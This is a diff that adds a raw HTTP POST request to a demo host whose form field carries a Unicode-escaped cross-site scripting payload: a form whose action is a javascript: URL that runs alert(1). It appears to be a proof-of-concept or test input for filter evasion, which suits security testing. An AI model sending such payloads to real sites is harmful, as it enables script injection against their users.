@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 116
+Connection: close
+
+input=\u003Cform action=\u0022javascript:alert(1)\u0022\u003E\u003Cbutton\u003Ex\u003C/button\u003E\u003C/form\u003E
